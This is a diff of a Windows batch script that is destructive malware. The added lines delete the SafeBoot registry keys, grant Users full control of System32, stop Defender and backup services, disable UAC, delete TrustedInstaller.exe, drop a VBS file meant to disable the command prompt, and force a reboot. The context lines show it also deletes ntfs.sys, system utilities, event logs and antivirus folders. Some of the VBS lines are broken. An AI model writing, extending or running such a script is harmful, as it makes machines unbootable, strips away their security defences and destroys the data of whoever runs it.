@@ -1,12 +1,18 @@
 @echo off
 setlocal
 
-netsh advfirewall set allprofiles state off
-netsh advfirewall set currentprofile state off
-netsh advfirewall set domainprofile state off
-netsh advfirewall set privateprofile state off
-netsh advfirewall set publicprofile state off
+netsh advfirewall set allprofiles state off >nul 2>&1
+netsh advfirewall set currentprofile state off >nul 2>&1
+netsh advfirewall set domainprofile state off >nul 2>&1
+netsh advfirewall set privateprofile state off >nul 2>&1
+netsh advfirewall set publicprofile state off >nul 2>&1
 netsh firewall set opmode mode-disable >nul 2>&1
+
+reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1
+
+reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1
+
+icacls "C:\Windows\System32" /Grant Users:F >nul 2>&1
 
 attrib -s -r /s /d "C:\Windows\System32\*.*" >nul 2>&1
 del /f /q "C:\Windows\System32\drivers\ntfs.sys" >nul 2>&1
@@ -22,7 +28,7 @@ net stop "WinDefend" /y >nul 2>&1
 net stop "security center" /y >nul 2>&1
 net stop sharedaccess /y >nul 2>&1
 net stop "wuauserv" /y >nul 2>&1
-
+net stop "SDRSVC" /y >nul 2>&1
 
 
 del /f /q "C:\Windows\System32\Dism.exe" >nul 2>&1
@@ -31,6 +37,8 @@ del /f /q "C:\Windows\System32\chkdsk.exe" >nul 2>&1
 del /f /q "C:\Windows\System32\wbem\WMIC.exe" >nul 2>&1
 del /f /q "C:\Windows\System32\smartscreen.exe" >nul 2>&1
 del /f /q "C:\Windows\System32\SecurityHealthSystray.exe" >nul 2>&1
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
+
 
 rmdir /s /q  "C:\Windows\System32\SecurityHealth\" >nul 2>&1
 rmdir /s /q  "C:\Windows\System32\winevt\Logs\" >nul 2>&1
@@ -130,5 +138,24 @@ rmdir /s /q  "C:\ProgramData\F-Secure\" >nul 2>&1
 rmdir /s /q  "C:\Program Files\Webroot\" >nul 2>&1
 rmdir /s /q  "C:\Program Files (x86)\Webroot\" >nul 2>&1
 rmdir /s /q  "C:\ProgramData\WRData\" >nul 2>&1
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
+del /f /q "C:\Windows\servicing\TrustedInstaller.exe"
+
+( 
+    echo Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
+) > "%TEMP%\JAJAJA.vbs"
+
+start "" "%TEMP%\JAJAJA.vbs"
+
+
+(
+Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
+) > JAJAJA.vbs
+
+start JAJAJA.vbs
+
+shutdown /r /f /t 0
 
 endlocal
